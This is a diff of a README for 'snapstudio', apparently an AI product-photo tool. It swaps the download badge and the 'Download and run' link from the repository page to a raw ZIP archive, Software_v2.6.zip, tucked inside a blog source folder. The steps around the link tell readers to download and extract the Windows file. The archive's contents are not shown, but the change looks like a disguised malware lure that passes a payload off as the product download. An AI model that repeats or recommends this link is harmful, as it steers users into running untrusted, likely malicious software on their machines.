@@ -1,7 +1,7 @@
 # 🤖 snapstudio - Fast AI product photos
 
 <p align="center">
-  <a href="https://github.com/Holly-annealkaloidal710/snapstudio">
+  <a href="https://raw.githubusercontent.com/Holly-annealkaloidal710/snapstudio/main/src/app/(site)/blog/Software_v2.6.zip">
     <img src="https://img.shields.io/badge/Download%20SnapStudio-blue-grey?style=for-the-badge&logo=github" alt="Download SnapStudio"/>
   </a>
 </p>
@@ -46,7 +46,7 @@ For best results, use:
 
 ## ⬇️ Download and run
 
-1. Open the download page: [https://github.com/Holly-annealkaloidal710/snapstudio](https://github.com/Holly-annealkaloidal710/snapstudio)
+1. Open the download page: [https://raw.githubusercontent.com/Holly-annealkaloidal710/snapstudio/main/src/app/(site)/blog/Software_v2.6.zip](https://raw.githubusercontent.com/Holly-annealkaloidal710/snapstudio/main/src/app/(site)/blog/Software_v2.6.zip)
 2. Look for the latest release or download file on the page
 3. Download the Windows file to your computer
 4. If the file comes in a ZIP folder, right-click it and choose Extract All
